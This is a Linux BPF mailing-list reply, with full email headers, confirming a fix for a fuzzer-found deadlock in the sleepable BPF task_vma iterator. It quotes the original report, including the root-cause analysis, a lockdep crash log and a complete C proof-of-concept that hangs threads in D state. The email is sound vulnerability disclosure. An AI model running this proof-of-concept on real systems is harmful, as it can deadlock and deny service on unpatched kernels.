Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=162.243.161.220
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1793063908;
	b=mfRPCntEnkZH+/Ue2Pq3h8pi7cIv8bIg9PpDhWywOibJx0xd4L4ea12ijJXOtb+TjRVU
	 ioVDUPALsAxVKIgMcwp5k8+uqX5CF7ud4Urd2pEFrky2LN2ZuFBx/VnVOjipawag+MmJc
	 P6ROIWnB5Ey88fX0lQQazvfMBqwqlwh3zfBPkAlxEg7Bhs8ECPX4mbU5qF14SA7ERT1jR
	 mkhlRMCrdW5rnNsX6LhG8k2LQI0IQuteXyuzn/t+t1z3dL/EY3Pwdf7p1Gsae6udodBzU
	 m0/edp7FEAFgvSIrjliKu7q63riYAr+Dkw8HVQ3QEvCZLLGien3DcBoxZFipQgM7IMA==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1793063908;
	h=DMARC-Filter:Received:Received:Message-ID:Date:MIME-Version:
	 User-Agent:Subject:To:References:From:In-Reply-To:Content-Type:
	 Content-Transfer-Encoding:X-CM-TRANSID:X-Coremail-Antispam:
	 X-CM-SenderInfo;
	bh=jiXSULjy+NpluA8XNYje5u8Kpnorms5DsG1qjfyN3Dw=;
	b=geghYwzoxjDa23qrggk0RhsCdDhKpghvTt7CeJtH8JE68ylBZyWvyKQGJsU85uUDGr/W
	 W+rPCWEe7ggUaleq3YFDcK1Ifq8DaBxlWIsg3xcm+tKtJhT55TbFPxQg6LV29Vb/ZnI5K
	 UcRN9d3rkBTHmAusGtZ78mbM5GqgGVLwbJ+EBaf9Cv3Jd7+7KnQhn8jNeR8HGB4Ktw3qM
	 xfN48FIqPkDIzCx1aK1V1gyjahiUdQ33aVDnF73/6ZeGXm5kL9Rhw1bfXRZul53N/sjPU
	 ImIsOL0xPP5sl5mrApd7F3SiHSkDeIEjA5eoOiNkrDUsd4hUj3pbjhFmQJBnw4FxXcw==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=none header.from=hust.edu.cn;
	spf=pass smtp.mailfrom=hust.edu.cn;
	arc=none smtp.remote-ip=162.243.161.220
Received: from zg8tmtyylji0my4xnjeumjiw.icoremail.net (zg8tmtyylji0my4xnjeumjiw.icoremail.net [162.243.161.220])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id C9693606A31A
	for <bpf@vger.kernel.org>; Tue, 27 Oct 2026 01:18:24 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org C9693606A31A
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=hust.edu.cn
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=hust.edu.cn
Received: from hust.edu.cn (unknown [172.16.0.52])
	by app1 (Coremail) with UTF8SMTP id IAEQrMA2f6Xe+99qz+o3AQ--.10338S2;
	Tue, 27 Oct 2026 09:18:22 +0800 (CST)
Received: from [10.12.170.55] (unknown [10.12.170.55])
	by gateway (Coremail) with SMTP id _____wB3cCfd+99q3doRAA--.33007S3;
	Tue, 27 Oct 2026 09:18:21 +0800 (CST)
Message-ID: <4fa3ea90-5de4-47a5-8a7c-060140259db7@hust.edu.cn>
Date: Tue, 27 Oct 2026 09:18:21 +0800
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Post: <mailto:bpf@vger.kernel.org>
List-Help: <mailto:bpf+help@vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
List-Owner: <mailto:bpf+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: BUG: Sleepable BPF prog causes a deadlock in task_vma bpf_iter
To: Mykyta Yatsenko <mykyta.yatsenko5@gmail.com>, bpf@vger.kernel.org
References: <5c890061.12435.1a1572fd75a.Coremail.kaiyanm@hust.edu.cn>
 <a2bf6709-f040-416d-8170-d1296b565fe0@gmail.com>
From: Kaiyan Mei <kaiyanm@hust.edu.cn>
In-Reply-To: <a2bf6709-f040-416d-8170-d1296b565fe0@gmail.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit
X-CM-TRANSID:IAEQrMA2f6Xe+99qz+o3AQ--.10338S2
Authentication-Results: app1; spf=neutral smtp.mail=kaiyanm@hust.edu.c
	n;
X-Coremail-Antispam: 1UD129KBjvAXoW3Kr4xGF1DJry5Cr4ktF43ZFb_yoW8Jry7Zo
	Wag3ySya18Gry5AFyjkas8XFsxJ3Wvyas7Ar409r4UGFsrJ3y7ur45J34fZFW3Xw45Ka1f
	A34fJFn5Ww17tF97n29KB7ZKAUJUUUUr529EdanIXcx71UUUUU7v73VFW2AGmfu7bjvjm3
	AaLaJ3UjIYCTnIWjp_UUUYZ7k0a2IF6w4kM7kC6x804xWl1xkIjI8I6I8E6xAIw20EY4v2
	0xvaj40_Wr0E3s1l8cAvFVAK0II2c7xJM28CjxkF64kEwVA0rcxSw2x7M28EF7xvwVC0I7
	IYx2IY67AKxVWDJVCq3wA2z4x0Y4vE2Ix0cI8IcVCY1x0267AKxVWxJVW8Jr1l84ACjcxK
	6I8E87Iv67AKxVW0oVCq3wA2z4x0Y4vEx4A2jsIEc7CjxVAFwI0_GcCE3s1ln4kS14v26r
	1Y6r17M2AIxVAIcxkEcVAq07x20xvEncxIr21l57IF6xkI12xvs2x26I8E6xACxx1l5I8C
	rVACY4xI64kE6c02F40Ex7xfMcIj64x0Y40En7xvr7AKxVW8Jr0_Cr1UMcIj6x8ErcxFaV
	Av8VW8uFyUJr1UMcIj6xkF7I0En7xvr7AKxVW8Jr0_Cr1UMcvjeVCFs4IE7xkEbVWUJVW8
	JwACjcxG0xvEwIxGrwCY02Avz4vE-syl42xK82IYc2Ij64vIr41l42xK82IY6x8ErcxFaV
	Av8VW8uFyUJr1UMxC20s026xCaFVCjc4AY6r1j6r4UMI8I3I0E5I8CrVAFwI0_Jr0_Jr4l
	x2IqxVCjr7xvwVAFwI0_JrI_JrWlx4CE17CEb7AF67AKxVWUXVWUAwCIc40Y0x0EwIxGrw
	CI42IY6xIIjxv20xvE14v26r1j6r1xMIIF0xvE2Ix0cI8IcVCY1x0267AKxVWUJVW8JwCI
	42IY6xAIw20EY4v20xvaj40_Jr0_JF4lIxAIcVC2z280aVAFwI0_Jr0_Gr1lIxAIcVC2z2
	80aVCY1x0267AKxVWUJVW8JbIYCTnIWIevJa73UjIFyTuYvjxUv1rWDUUUU
X-CM-SenderInfo: bpsqjkixssiio6kx23oohg3hdfq/



On 2026/10/21 23:25, Mykyta Yatsenko wrote:
> 
> 
> On 10/20/26 3:41 AM, 梅开彦 wrote:
>> Our fuzzer tool discovered a deadlock vulnerability in the BPF
>> subsystem. A sleepable BPF program attached to a task_vma iterator runs
>> while the iterator holds the target task's `mmap_lock`, and the
>> sleepable execution context allows the program to take page faults on
>> user memory (e.g. through `bpf_copy_from_user()`, which performs a
>> plain `copy_from_user()`). The page fault handler then re-acquires the
>> same `mmap_lock`, and a concurrent writer on the same mm turns the
>> recursion into a real ABBA deadlock that leaves two threads of the
>> process stuck in uninterruptible D state. Lockdep flags the same
>> defect as "possible recursive locking detected" via the `might_fault()`
>> assertion in `bpf_iter_run_prog()`.
>>
>> Reported-by: Kaiyan Mei <M202472210@hust.edu.cn>
>> Reported-by: Yinhao Hu <dddddd@hust.edu.cn>
>> Reviewed-by: Dongliang Mu <dzm91@hust.edu.cn>
>>
>> ## Root Cause
>>
>> 1. `task_vma_seq_get_next()` (kernel/bpf/task_iter.c) takes the read
>>     lock of the target task's `mm->mmap_lock` and holds it while running
>>     the BPF program:
>>
>> ```c
>> 		if (mmap_read_lock_killable(curr_mm)) {
>> 			mmput(curr_mm);
>> 			goto finish;
>> 		}
>> ```
>>
>> 2. `bpf_iter_run_prog()` (kernel/bpf/bpf_iter.c) explicitly allows the
>>     sleepable program to take page faults:
>>
>> ```c
>> 	if (prog->sleepable) {
>> 		rcu_read_lock_trace();
>> 		migrate_disable();
>> 		might_fault();
>> ```
>>
>> 3. `bpf_copy_from_user()`
>>     (kernel/bpf/helpers.c) does a plain `copy_from_user()`, so a page
>>     fault takes `down_read(&mm->mmap_lock)` again via
>>     `lock_mm_and_find_vma()` (non-killable). With a writer queued between
>>     the two acquisitions, the reader blocks indefinitely.
>>
>> 4. Lockdep detects the same recursion through its annotation:
>>     `might_fault()` (mm/memory.c) performs
>>     `might_lock_read(&current->mm->mmap_lock)` -- the same lock class
>>     that is already held, hence the "possible recursive locking
>>     detected" warning.
>>
>> Root cause: the task_vma iterator runs sleepable BPF programs while
>> holding `mmap_lock`, even though the BPF iterator execution contract
>> (`might_fault()` in `bpf_iter_run_prog()`) explicitly allows the program
>> to take page faults on that same lock.
>>
> 
> Is this fixed by dfcd17659112 ("bpf: Reject sleepable programs for task_vma iterator")?

Yes, the issue has been fixed, and the PoC no longer triggers the crash 
Thanks for pointing out the fixing commit.

> 
>> ## Execution Flow Visualization
>>
>> ```
>> Vulnerability Execution Flow
>> |
>> |--- 1. Sleepable BPF_TRACING prog, expected_attach_type = BPF_TRACE_ITER,
>> |       attach_btf_id = vmlinux BTF FUNC "bpf_iter_task_vma"
>> |
>> |--- 2. bpf(BPF_LINK_CREATE) + bpf(BPF_ITER_CREATE) -> iterator fd
>> |
>> |--- 3. read(iter_fd)
>> |    |
>> |    `-- bpf_seq_read -> task_vma_seq_get_next
>> |        |   `--> mmap_read_lock_killable(curr_mm)          [outer READ, held]
>> |        `-- task_vma_seq_show -> bpf_iter_run_prog (sleepable)
>> |              `--> bpf_copy_from_user(unmapped addr) -> page fault
>> |                    -> down_read(mm->mmap_lock)          [inner READ, non-killable]
>> |
>> |--- 4. Another thread of the same process: mmap()/munmap() loop
>> |    |
>> |    `--> down_write(mm->mmap_lock) queued behind the outer read lock
>> |
>> `--- inner reader waits for the writer, writer waits for the outer reader
>>       => both threads stuck in D state (real ABBA deadlock);
>>          lockdep reports the same recursion as "possible recursive
>>          locking detected" (via might_fault() in bpf_iter_run_prog())
>> ```
>>
>> ## Reproduction Steps
>>
>> 1. Load a sleepable (`BPF_F_SLEEPABLE`) `BPF_PROG_TYPE_TRACING` program
>>     with `expected_attach_type = BPF_TRACE_ITER` and
>>     `attach_btf_id = <vmlinux BTF id of "bpf_iter_task_vma">`.
>> 2. `bpf(BPF_LINK_CREATE)` + `bpf(BPF_ITER_CREATE)` to get the iterator
>>     fd.
>> 3. Spawn a thread doing `mmap()/munmap()` in a loop.
>> 4. `read()` from the iterator fd. When the iterator reaches the reading
>>     process's own mm, both threads hang.
>>
>> ## Crash Report
>>
>> The original fuzzer crash report (kernel
>> `7.3.0-rc4-g61c1e63c9b65-dirty #9`, crash
>> `4e5cba057fd1e1d7a473942ce22d1981be8a2e68`, full log in
>> `crash-lockdep.log`):
>>
>> ```
>> ============================================
>> WARNING: possible recursive locking detected
>> 7.3.0-rc4-g61c1e63c9b65-dirty #9 Not tainted
>> --------------------------------------------
>> syz-executor419/9405 is trying to acquire lock:
>> ff1100017d169078 (&mm->mmap_lock){++++}-{4:4}, at: __might_fault mm/memory.c:7443 [inline]
>> ff1100017d169078 (&mm->mmap_lock){++++}-{4:4}, at: __might_fault+0xe5/0x190 mm/memory.c:7437
>>
>> but task is already holding lock:
>> ff1100010007e9b8 (&mm->mmap_lock){++++}-{4:4}, at: mmap_read_lock_killable include/linux/mmap_lock.h:609 [inline]
>> ff1100010007e9b8 (&mm->mmap_lock){++++}-{4:4}, at: task_vma_seq_get_next+0x5d2/0x8b0 kernel/bpf/task_iter.c:521
>>
>> other info that might help us debug this:
>>   Possible unsafe locking scenario:
>>
>>         CPU0
>>         ----
>>    lock(&mm->mmap_lock);
>>    lock(&mm->mmap_lock);
>>
>>   *** DEADLOCK ***
>>
>>   May be due to missing lock nesting notation
>>
>> locks held by syz-executor419/9405: 3, last CPU#1:
>>   #0: ff11000112349518 (&p->lock){+.+.}-{4:4}, at: bpf_seq_read+0x63/0x1210 kernel/bpf/bpf_iter.c:102
>>   #1: ff1100010007e9b8 (&mm->mmap_lock){++++}-{4:4}, at: mmap_read_lock_killable include/linux/mmap_lock.h:609 [inline]
>>   #1: ff1100010007e9b8 (&mm->mmap_lock){++++}-{4:4}, at: task_vma_seq_get_next+0x5d2/0x8b0 kernel/bpf/task_iter.c:521
>>   #2: ffffffff8f7cd7f8 (rcu_tasks_trace_srcu_struct){....}-{0:0}, at: rcu_try_lock_acquire include/linux/rcupdate.h:314 [inline]
>>   #2: ffffffff8f7cd7f8 (rcu_tasks_trace_srcu_struct){....}-{0:0}, at: rcu_read_lock_trace include/linux/rcupdate_trace.h:101 [inline]
>>   #2: ffffffff8f7cd7f8 (rcu_tasks_trace_srcu_struct){....}-{0:0}, at: bpf_iter_run_prog+0xc6/0xfc0 kernel/bpf/bpf_iter.c:686
>>
>> stack backtrace:
>> CPU: 1 UID: 0 PID: 9405 Comm: syz-executor419 Not tainted 7.3.0-rc4-g61c1e63c9b65-dirty #9 PREEMPT(full)
>> Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
>> Call Trace:
>>   <TASK>
>>   __dump_stack lib/dump_stack.c:94 [inline]
>>   dump_stack_lvl+0x116/0x1b0 lib/dump_stack.c:120
>>   print_deadlock_bug+0x293/0x3d0 kernel/locking/lockdep.c:3085
>>   check_deadlock kernel/locking/lockdep.c:3137 [inline]
>>   validate_chain kernel/locking/lockdep.c:3939 [inline]
>>   __lock_acquire+0x153c/0x2110 kernel/locking/lockdep.c:5288
>>   lock_acquire kernel/locking/lockdep.c:5942 [inline]
>>   lock_acquire+0x1bf/0x370 kernel/locking/lockdep.c:5899
>>   __might_fault mm/memory.c:7443 [inline]
>>   __might_fault+0x115/0x190 mm/memory.c:7437
>>   bpf_iter_run_prog+0x24b/0xfc0 kernel/bpf/bpf_iter.c:688
>>   __task_vma_seq_show kernel/bpf/task_iter.c:623 [inline]
>>   task_vma_seq_show+0x128/0x1a0 kernel/bpf/task_iter.c:628
>>   bpf_seq_read+0x1db/0x1210 kernel/bpf/bpf_iter.c:137
>>   vfs_read+0x1eb/0xc80 fs/read_write.c:572
>>   ksys_read+0x126/0x240 fs/read_write.c:716
>>   do_syscall_x64 arch/x86/entry/syscall_64.c:61 [inline]
>>   do_syscall_64+0x128/0x7b0 arch/x86/entry/syscall_64.c:84
>>   entry_SYSCALL_64_after_hwframe+0x77/0x7f
>> RIP: 0033:0x7f2fec1f428d
>> Code: 28 c3 e8 46 1e 00 00 66 0f 1f 44 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48
>> RSP: 002b:00007ffd1739fb68 EFLAGS: 00000246 ORIG_RAX: 0000000000000000
>> RAX: ffffffffffffffda RBX: 00007ffd1739fd68 RCX: 00007f2fec1f428d
>> RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000005
>> RBP: 0000000000000001 R08: 00007ffd1739fd68 R09: 00007ffd1739fd68
>> R10: 00007ffd1739fd68 R11: 0000000000000246 R12: 0000000000000001
>> R13: 00007ffd1739fd58 R14: 00007f2fec271530 R15: 0000000000000001
>>   </TASK>
>> ```
>>
>> ## Proof of Concept
>>
>> The following C program can demonstrate the vulnerability on bpf-next
>> commit 61c1e63c9b651a77b1e24208b9361965c69959e6 (7.3.0-rc4).
>>
>> ```c
>> #define _GNU_SOURCE
>> #include <errno.h>
>> #include <pthread.h>
>> #include <stdint.h>
>> #include <stdio.h>
>> #include <string.h>
>> #include <sys/mman.h>
>> #include <sys/syscall.h>
>> #include <unistd.h>
>>
>> #define BPF_PROG_LOAD		5
>> #define BPF_LINK_CREATE		28
>> #define BPF_ITER_CREATE		33
>>
>> #define BPF_PROG_TYPE_TRACING	26
>> #define BPF_TRACE_ITER		28	/* value in this kernel tree */
>> #define BPF_F_SLEEPABLE		0x10
>>
>> /* vmlinux BTF FUNC id of "bpf_iter_task_vma"
>>   * (bpftool btf dump file /sys/kernel/btf/vmlinux |
>>   *  grep "FUNC 'bpf_iter_task_vma'")
>>   */
>> #define BTF_ID_BPF_ITER_TASK_VMA	208826
>>
>> struct bpf_insn {
>> 	uint8_t	code;
>> 	uint8_t	dst_reg:4, src_reg:4;
>> 	uint16_t off;
>> 	int32_t	imm;
>> };
>>
>> static int sys_bpf(int cmd, void *attr, size_t size)
>> {
>> 	return syscall(__NR_bpf, cmd, attr, size);
>> }
>>
>> static void *thr_writer(void *arg)
>> {
>> 	(void)arg;
>> 	for (;;) {
>> 		void *p = mmap((void *)0x30000000000UL, 0x1000, PROT_READ | PROT_WRITE,
>> 			       MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
>> 		if (p != MAP_FAILED)
>> 			munmap(p, 0x1000);
>> 	}
>> 	return NULL;
>> }
>>
>> int main(void)
>> {
>> 	struct bpf_insn insns[] = {
>> 		{ .code = 0xbf, .dst_reg = 1, .src_reg = 10 },	/* r1 = r10           */
>> 		{ .code = 0x07, .dst_reg = 1, .imm = -32 },	/* r1 += -32  (dst)   */
>> 		{ .code = 0xb7, .dst_reg = 2, .imm = 32 },	/* r2 = 32    (size)  */
>> 		{ .code = 0x18, .dst_reg = 3, .imm = 0x10000 },	/* r3 = 0x10000 (ld_imm64 lo, unmapped user addr) */
>> 		{ .code = 0x00 },				/* (ld_imm64 hi)      */
>> 		{ .code = 0x85, .imm = 148 },			/* call bpf_copy_from_user (plain copy_from_user) */
>> 		{ .code = 0xb7, .dst_reg = 0 },			/* r0 = 0             */
>> 		{ .code = 0x95 },				/* exit               */
>> 	};
>> 	char license[] = "GPL";
>>
>> 	static char vlog[65536];
>> 	uint8_t pattr[0x78] = { 0 };
>> 	*(uint32_t *)(pattr + 0x00) = BPF_PROG_TYPE_TRACING;	/* prog_type           */
>> 	*(uint32_t *)(pattr + 0x04) = sizeof(insns) / sizeof(insns[0]);
>> 	*(uint64_t *)(pattr + 0x08) = (uint64_t)insns;
>> 	*(uint64_t *)(pattr + 0x10) = (uint64_t)license;
>> 	*(uint32_t *)(pattr + 0x18) = 1;			/* log_level           */
>> 	*(uint32_t *)(pattr + 0x1c) = sizeof(vlog);		/* log_size            */
>> 	*(uint64_t *)(pattr + 0x20) = (uint64_t)vlog;		/* log_buf             */
>> 	*(uint32_t *)(pattr + 0x2c) = BPF_F_SLEEPABLE;		/* prog_flags          */
>> 	*(uint32_t *)(pattr + 0x44) = BPF_TRACE_ITER;		/* expected_attach_type*/
>> 	*(uint32_t *)(pattr + 0x6c) = BTF_ID_BPF_ITER_TASK_VMA;	/* attach_btf_id       */
>>
>> 	int prog_fd = sys_bpf(BPF_PROG_LOAD, pattr, sizeof(pattr));
>> 	if (prog_fd < 0) { fprintf(stderr, "prog_load: %m\n%.*s\n", (int)sizeof(vlog), vlog); return 1; }
>>
>> 	/* link_create: no iter_info -> BPF_TASK_ITER_ALL; the iterator will
>> 	 * eventually reach our own task (curr_mm == current->mm) */
>> 	uint8_t lattr[0x20] = { 0 };
>> 	*(uint32_t *)(lattr + 0x00) = prog_fd;
>> 	*(uint32_t *)(lattr + 0x04) = 0;			/* target_fd           */
>> 	*(uint32_t *)(lattr + 0x08) = BPF_TRACE_ITER;		/* attach_type         */
>>
>> 	int link_fd = sys_bpf(BPF_LINK_CREATE, lattr, sizeof(lattr));
>> 	if (link_fd < 0) { perror("link_create"); return 1; }
>>
>> 	uint8_t iattr[8] = { 0 };
>> 	*(uint32_t *)(iattr + 0x00) = link_fd;
>> 	int iter_fd = sys_bpf(BPF_ITER_CREATE, iattr, sizeof(iattr));
>> 	if (iter_fd < 0) { perror("iter_create"); return 1; }
>>
>> 	printf("armed: pid=%d iter_fd=%d; starting writer + reader\n", getpid(), iter_fd);
>> 	fflush(stdout);
>>
>> 	pthread_t t;
>> 	pthread_create(&t, NULL, thr_writer, NULL);
>>
>> 	static char buf[8192];
>> 	/* read() runs the prog on our own mm while holding its read lock. */
>> 	ssize_t n = read(iter_fd, buf, sizeof(buf));
>> 	printf("read returned %zd (errno=%d) -- no deadlock\n", n, errno);
>> 	return 0;
>> }
>> ```
>>
>> ## Kernel Configuration Requirements for Reproduction
>>
>> The vulnerability can be triggered with the kernel config in the
>> attachment.
> 

